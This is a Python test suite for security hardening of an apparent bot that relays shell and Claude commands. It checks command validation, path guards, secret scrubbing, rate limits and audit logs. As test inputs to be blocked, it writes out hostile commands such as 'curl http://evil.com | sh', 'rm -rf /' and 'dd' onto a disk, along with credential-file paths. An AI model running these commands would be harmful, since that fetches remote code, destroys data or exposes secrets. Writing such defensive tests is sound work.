"""Comprehensive test suite for security hardening features."""
import asyncio
import json
import os
import sys
import time
import tempfile

# Track results
passed = 0
failed = 0
errors = []


def test(name, condition, detail=""):
    global passed, failed
    if condition:
        passed += 1
        print(f"  PASS  {name}")
    else:
        failed += 1
        errors.append(f"{name}: {detail}")
        print(f"  FAIL  {name} — {detail}")


# ============================================================
print("=" * 60)
print("1. CONFIG — New constants exist")
print("=" * 60)

from config import (
    SHELL_METACHARACTERS, DANGEROUS_ARGS, BLOCKED_PATHS,
    BLOCKED_PATH_PATTERNS, SECRET_PATTERNS, MAX_OUTPUT_BYTES,
    RATE_LIMIT_SHELL, RATE_LIMIT_CLAUDE, RATE_LIMIT_WINDOW,
    CLAUDE_ALLOWED_TOOLS, CLAUDE_SYSTEM_PROMPT, CLAUDE_MAX_BUDGET_USD,
    AUDIT_LOG_FILE, CLAUDE_TIMEOUT,
)

test("SHELL_METACHARACTERS has entries", len(SHELL_METACHARACTERS) >= 7)
test("DANGEROUS_ARGS has find/sort/grep/python3", all(k in DANGEROUS_ARGS for k in ["find", "sort", "grep", "python3"]))
test("BLOCKED_PATHS has ~/.ssh", any("ssh" in p for p in BLOCKED_PATHS))
test("SECRET_PATTERNS has entries", len(SECRET_PATTERNS) >= 5)
test("MAX_OUTPUT_BYTES is 50KB", MAX_OUTPUT_BYTES == 50 * 1024)
test("RATE_LIMIT_SHELL is 20", RATE_LIMIT_SHELL == 20)
test("RATE_LIMIT_CLAUDE is 5", RATE_LIMIT_CLAUDE == 5)
test("RATE_LIMIT_WINDOW is 60", RATE_LIMIT_WINDOW == 60)
test("CLAUDE_ALLOWED_TOOLS set", "Read" in CLAUDE_ALLOWED_TOOLS and "Bash(git:*)" in CLAUDE_ALLOWED_TOOLS)
test("CLAUDE_ALLOWED_TOOLS excludes unrestricted Bash", "Bash," not in CLAUDE_ALLOWED_TOOLS)
test("CLAUDE_SYSTEM_PROMPT blocks .ssh", ".ssh" in CLAUDE_SYSTEM_PROMPT)
test("CLAUDE_MAX_BUDGET_USD is 1.0", CLAUDE_MAX_BUDGET_USD == 1.0)
test("CLAUDE_TIMEOUT is 300", CLAUDE_TIMEOUT == 300)
test("AUDIT_LOG_FILE ends with audit.jsonl", AUDIT_LOG_FILE.endswith("audit.jsonl"))

# ============================================================
print()
print("=" * 60)
print("2. SHELL METACHARACTER BLOCKING")
print("=" * 60)

from handlers.shell import validate_command

metachar_tests = [
    ("ls; rm -rf /",          ";",   True),
    ("echo foo && cat bar",   "&&",  True),
    ("echo foo || cat bar",   "||",  True),
    ("echo $(whoami)",        "$(",  True),
    ("echo `id`",             "`",   True),
    ("cat <(ls)",             "<(",  True),
    ("ls >(out.txt)",         ">(",  True),
    ("ls -la",                None,  False),
    ("pwd",                   None,  False),
    ("cat file.txt | head",   None,  False),
]

for cmd, meta, should_block in metachar_tests:
    result = validate_command(cmd)
    if should_block:
        test(f"Blocks '{cmd}'", result is not None and meta in result, f"got: {result}")
    else:
        test(f"Allows '{cmd}'", result is None, f"got: {result}")

# ============================================================
print()
print("=" * 60)
print("3. ARGUMENT INJECTION DEFENSE")
print("=" * 60)

from handlers.shell import _check_dangerous_args

arg_tests = [
    ("find",    ["find", ".", "-exec", "rm", "{}"],         True),
    ("find",    ["find", ".", "-execdir", "sh", "-c", "x"], True),
    ("find",    ["find", ".", "-delete"],                    True),
    ("find",    ["find", ".", "-ok", "rm", "{}"],            True),
    ("find",    ["find", ".", "-name", "*.py"],              False),
    ("sort",    ["sort", "--compress-prog=evil"],            True),
    ("sort",    ["sort", "-r", "file.txt"],                  False),
    ("grep",    ["grep", "--pre=evil", "foo"],               True),
    ("grep",    ["grep", "-r", "pattern", "."],              False),
    ("python3", ["python3", "-c", "import os"],              True),
    ("python3", ["python3", "script.py"],                    False),
]

for cmd, parts, should_block in arg_tests:
    result = _check_dangerous_args(cmd, parts)
    args_str = " ".join(parts[1:3])
    if should_block:
        test(f"Blocks {cmd} {args_str}", result is not None, f"got: {result}")
    else:
        test(f"Allows {cmd} {args_str}", result is None, f"got: {result}")

# ============================================================
print()
print("=" * 60)
print("4. PATH GUARD")
print("=" * 60)

from utils.path_guard import check_path, guard_command_paths

path_tests = [
    ("~/.ssh/id_rsa",           True),
    ("~/.ssh/",                 True),
    ("~/.aws/credentials",      True),
    ("~/.gnupg/pubring.kbx",   True),
    ("~/.docker/config.json",   True),
    ("~/.config/something",     True),
    ("~/.zshrc",                True),
    ("~/.bashrc",               True),
    ("~/.zsh_history",          True),
    ("~/.bash_history",         True),
    ("~/Library/Keychains/x",   True),
    ("/etc/passwd",             True),
    ("/etc/shadow",             True),
    (".env",                    True),
    ("app/.env",                True),
    (".env.local",              True),
    # Safe paths
    ("/tmp/safe",               False),
    ("README.md",               False),
    ("src/main.py",             False),
    ("~/.local/bin/tool",       False),
]

for path, should_block in path_tests:
    result = check_path(path)
    if should_block:
        test(f"Blocks path '{path}'", result is not None, f"got: {result}")
    else:
        test(f"Allows path '{path}'", result is None, f"got: {result}")

# Test guard_command_paths integration
test("Blocks 'cat ~/.ssh/id_rsa'", guard_command_paths("cat ~/.ssh/id_rsa") is not None)
test("Blocks 'cat .env'", guard_command_paths("cat .env") is not None)
test("Allows 'cat README.md'", guard_command_paths("cat README.md") is None)
test("Blocks 'head /etc/passwd'", guard_command_paths("head /etc/passwd") is not None)

# Full validate_command integration
test("validate_command blocks 'cat ~/.ssh/id_rsa'", validate_command("cat ~/.ssh/id_rsa") is not None)
test("validate_command blocks 'cat .env'", validate_command("cat .env") is not None)

# ============================================================
print()
print("=" * 60)
print("5. OUTPUT SCRUBBING")
print("=" * 60)

from utils.scrubber import scrub_output

scrub_tests = [
    # (input, should_contain_redacted, description)
    # These are deliberately fake values that match our regex patterns
    ("sk-ant-" + "X" * 25, True, "Anthropic API key"),
    ("sk-" + "X" * 25, True, "OpenAI-style API key"),
    ("ghp_" + "X" * 40, True, "GitHub PAT"),
    ("xoxb-" + "X" * 25, True, "Slack bot token"),
    ("1234567890:" + "X" * 35, True, "Telegram bot token"),
    ("PASSWORD=mysecretpassword123", True, "PASSWORD= line"),
    ("SECRET=abc123", True, "SECRET= line"),
    ("TOKEN=xyz789", True, "TOKEN= line"),
    ("API_KEY=something", True, "KEY= line"),
    ("Hello, this is normal output", False, "Safe text"),
    ("exit code 0", False, "Safe text with numbers"),
    ("file.py:42: error", False, "Error output"),
]

for text, should_redact, desc in scrub_tests:
    result = scrub_output(text)
    if should_redact:
        test(f"Scrubs {desc}", "[REDACTED]" in result, f"got: {result!r}")
    else:
        test(f"Preserves {desc}", result == text, f"got: {result!r}")

# Test multi-line scrubbing
multiline = "Line 1 ok\nPASSWORD=secret\nLine 3 ok\nsk-ant-" + "Y" * 25
result = scrub_output(multiline)
test("Multi-line scrub: redacts secret lines", "[REDACTED]" in result)
test("Multi-line scrub: preserves safe lines", "Line 1 ok" in result or "Line 3 ok" in result)

# ============================================================
print()
print("=" * 60)
print("6. RATE LIMITER")
print("=" * 60)

from utils.rate_limiter import RateLimiter

# Shell rate limit (20/min)
rl = RateLimiter()
for i in range(20):
    r = rl.check(100, "shell")
    if i < 20:
        test(f"Shell request {i+1}/20 allowed", r is None, f"got: {r}") if i in [0, 9, 19] else None
        if r is not None:
            test(f"Shell request {i+1} should be allowed", False, f"blocked at {i+1}")
            break

r = rl.check(100, "shell")
test("Shell request 21 blocked", r is not None and "Rate limited" in r, f"got: {r}")

# Claude rate limit (5/min)
rl2 = RateLimiter()
for i in range(5):
    r = rl2.check(200, "claude")
    if r is not None:
        test(f"Claude request {i+1} should be allowed", False, f"blocked at {i+1}")
        break

r = rl2.check(200, "claude")
test("Claude request 6 blocked", r is not None and "Rate limited" in r, f"got: {r}")

# Different users don't interfere
rl3 = RateLimiter()
for i in range(5):
    rl3.check(300, "claude")
r = rl3.check(301, "claude")  # different user
test("Different user not affected", r is None, f"got: {r}")

# ============================================================
print()
print("=" * 60)
print("7. AUDIT LOGGING")
print("=" * 60)

from utils.audit import log_action

# Use a temporary audit file
import config
original_audit = config.AUDIT_LOG_FILE
test_audit_file = tempfile.mktemp(suffix=".jsonl")
config.AUDIT_LOG_FILE = test_audit_file

# Reimport to pick up change — actually, log_action reads from config directly
# so we need to patch at the module level
import utils.audit
utils.audit.AUDIT_LOG_FILE = test_audit_file

log_action(123, "shell", prompt="ls -la", result="ok", duration_s=0.5)
log_action(123, "claude", prompt="Write fizzbuzz", result="ok", duration_s=12.3)
log_action(456, "unauthorized", result="denied")

# Read and verify
with open(test_audit_file) as f:
    lines = f.readlines()

test("Audit log has 3 entries", len(lines) == 3, f"got {len(lines)} lines")

entry1 = json.loads(lines[0])
test("Entry 1 has timestamp", "ts" in entry1)
test("Entry 1 user_id correct", entry1["user_id"] == 123)
test("Entry 1 action is shell", entry1["action"] == "shell")
test("Entry 1 prompt recorded", entry1["prompt"] == "ls -la")
test("Entry 1 result is ok", entry1["result"] == "ok")
test("Entry 1 duration recorded", entry1["duration_s"] == 0.5)

entry3 = json.loads(lines[2])
test("Entry 3 action is unauthorized", entry3["action"] == "unauthorized")
test("Entry 3 result is denied", entry3["result"] == "denied")

# Long prompt truncation
log_action(123, "claude", prompt="x" * 500, result="ok")
with open(test_audit_file) as f:
    last_line = f.readlines()[-1]
entry4 = json.loads(last_line)
test("Long prompt truncated to 200 chars", len(entry4["prompt"]) == 200)

# Cleanup
os.unlink(test_audit_file)
config.AUDIT_LOG_FILE = original_audit
utils.audit.AUDIT_LOG_FILE = original_audit

# ============================================================
print()
print("=" * 60)
print("8. CLAUDE STREAM PARSER")
print("=" * 60)

from utils.claude_stream import parse_stream_line, parse_stream_events, StreamEvent

# Test individual line parsing
e = parse_stream_line('{"type": "assistant", "message": {"type": "text", "text": "Hello world"}}')
test("Parses text event", e is not None and e.kind == "text" and e.data == "Hello world")

e = parse_stream_line('{"type": "assistant", "message": {"type": "tool_use", "name": "Read", "input": {"file_path": "/tmp/foo"}}}')
test("Parses Read tool event", e is not None and e.kind == "tool_use" and "/tmp/foo" in e.data)

e = parse_stream_line('{"type": "assistant", "message": {"type": "tool_use", "name": "Edit", "input": {"file_path": "main.py"}}}')
test("Parses Edit tool event", e is not None and e.kind == "tool_use" and "main.py" in e.data)

e = parse_stream_line('{"type": "assistant", "message": {"type": "tool_use", "name": "Bash", "input": {"command": "git status"}}}')
test("Parses Bash tool event", e is not None and e.kind == "tool_use" and "git status" in e.data)

e = parse_stream_line('{"type": "assistant", "message": {"type": "tool_use", "name": "Glob", "input": {"pattern": "**/*.py"}}}')
test("Parses Glob tool event", e is not None and e.kind == "tool_use" and "**/*.py" in e.data)

e = parse_stream_line('{"type": "result", "result": "Done", "session_id": "abc-123"}')
test("Parses result with session_id", e is not None and e.kind == "result" and e.session_id == "abc-123")

e = parse_stream_line('{"type": "assistant", "message": {"type": "thinking"}}')
test("Parses thinking event", e is not None and e.kind == "thinking")

e = parse_stream_line("")
test("Empty line returns None", e is None)

e = parse_stream_line("not json")
test("Invalid JSON returns None", e is None)

# Test multi-line parsing
raw = '\n'.join([
    '{"type": "assistant", "message": {"type": "text", "text": "Starting..."}}',
    '{"type": "assistant", "message": {"type": "tool_use", "name": "Read", "input": {"file_path": "x.py"}}}',
    '{"type": "assistant", "message": {"type": "text", "text": "Here is the fix."}}',
    '{"type": "result", "result": "Complete", "session_id": "sess-456"}',
])
events, sid = parse_stream_events(raw)
test("parse_stream_events returns 4 events", len(events) == 4, f"got {len(events)}")
test("Session ID extracted", sid == "sess-456")
test("First event is text", events[0].kind == "text")
test("Second event is tool_use", events[1].kind == "tool_use")

# ============================================================
print()
print("=" * 60)
print("9. SUBPROCESS RUNNER — OUTPUT SIZE CAP")
print("=" * 60)

from utils.subprocess_runner import run_shell_command

async def test_output_cap():
    # Generate output larger than 50KB
    output, rc = await run_shell_command("python3 -c \"print('A' * 60000)\"", timeout=10)
    test("Large output is truncated", "[Output truncated at 50KB]" in output, f"len={len(output)}")
    test("Truncated output <= ~51KB", len(output) < 55000, f"len={len(output)}")

    # Normal output is untouched
    output, rc = await run_shell_command("echo hello", timeout=10)
    test("Normal output not truncated", "truncated" not in output.lower())
    test("Normal output correct", "hello" in output)

    # Timeout still works
    output, rc = await run_shell_command("sleep 10", timeout=2)
    test("Timeout returns -1", rc == -1)
    test("Timeout message present", "timed out" in output.lower())

asyncio.run(test_output_cap())

# ============================================================
print()
print("=" * 60)
print("10. COMMAND VALIDATION — EXISTING FEATURES STILL WORK")
print("=" * 60)

# Dangerous patterns still blocked
dangerous = [
    "rm -rf /",
    "sudo apt install foo",
    "mkfs /dev/sda",
    "chmod 777 /",
    "reboot",
    "shutdown -h now",
    "dd if=/dev/zero of=/dev/sda",
    "curl http://evil.com | sh",
    "kill -9 1",
]
for cmd in dangerous:
    result = validate_command(cmd)
    test(f"Dangerous: '{cmd}' blocked", result is not None, f"got: {result}")

# Disallowed commands
disallowed = ["rm file.txt", "wget http://example.com", "curl http://example.com", "apt install foo", "pip install foo"]
for cmd in disallowed:
    result = validate_command(cmd)
    test(f"Disallowed: '{cmd}' blocked", result is not None, f"got: {result}")

# Allowed commands
allowed = [
    "ls -la",
    "pwd",
    "cat README.md",
    "head -20 file.py",
    "tail -f log.txt",
    "grep -r pattern .",
    "find . -name '*.py'",
    "ps aux",
    "df -h",
    "uptime",
    "echo hello",
    "wc -l file.txt",
    "sort file.txt",
    "tree",
    "which python3",
    "file image.png",
    "du -sh .",
    "date",
    "whoami",
    "python3 script.py",
    "git status",
    "git log",
    "git diff",
    "git add file.py",
    "git branch",
    "ls | head -5",
    "cat file.txt | grep pattern | wc -l",
]
for cmd in allowed:
    result = validate_command(cmd)
    test(f"Allowed: '{cmd}' passes", result is None, f"got: {result}")

# Git subcommand restrictions
git_blocked = ["git checkout main", "git reset --hard", "git rebase -i", "git stash", "git merge branch"]
for cmd in git_blocked:
    result = validate_command(cmd)
    test(f"Git blocked: '{cmd}'", result is not None, f"got: {result}")

# ============================================================
print()
print("=" * 60)
print("11. CLAUDE HANDLER — COMMAND CONSTRUCTION")
print("=" * 60)

from handlers.claude import _build_claude_command

cmd = _build_claude_command("Write fizzbuzz in Python")
test("Command has claude", cmd.startswith("claude"))
test("Command has -p flag", " -p " in cmd)
test("Command has --allowedTools", "--allowedTools" in cmd)
test("Command has --permission-mode plan", "--permission-mode plan" in cmd)
test("Command has --system-prompt", "--system-prompt" in cmd)
test("Command has --max-budget-usd", "--max-budget-usd 1.0" in cmd)
test("Command has --output-format stream-json", "--output-format stream-json" in cmd)
test("Command does NOT have --resume (no session)", "--resume" not in cmd)

cmd_resume = _build_claude_command("Continue", session_id="abc-123")
test("Resume command has --resume", "--resume" in cmd_resume)

# ============================================================
print()
print("=" * 60)
print("12. INTEGRATION — FULL PIPELINE TESTS")
print("=" * 60)

# Metachar + dangerous pattern combo
test("';rm -rf /' blocked (metachar first)", validate_command(";rm -rf /") is not None)

# Pipe with dangerous command
test("'ls | rm' blocked (rm not in allowlist)", validate_command("ls | rm file") is not None)

# Path guard through pipes
test("'cat ~/.ssh/id_rsa | head' blocked", validate_command("cat ~/.ssh/id_rsa | head") is not None)

# Scrubber + multiline
big = "Normal line\nsk-ant-" + "Z" * 25 + "\nAnother line\nghp_" + "Z" * 40
scrubbed = scrub_output(big)
test("Multiline scrub catches all secrets", scrubbed.count("[REDACTED]") >= 2)
test("Multiline scrub preserves normal", "Normal line" in scrubbed)

# ============================================================
print()
print("=" * 60)
print("13. BOT.PY — HANDLER REGISTRATION")
print("=" * 60)

import bot
import inspect

src = inspect.getsource(bot.main)
test("bot.py registers /claude", "claude_handler" in src)
test("bot.py registers /claude_continue", "claude_continue_handler" in src)
test("bot.py imports claude_continue_handler", "claude_continue_handler" in inspect.getsource(bot))

# ============================================================
print()
print("=" * 60)
print(f"RESULTS: {passed} passed, {failed} failed")
print("=" * 60)

if errors:
    print("\nFailed tests:")
    for e in errors:
        print(f"  - {e}")

sys.exit(0 if failed == 0 else 1)
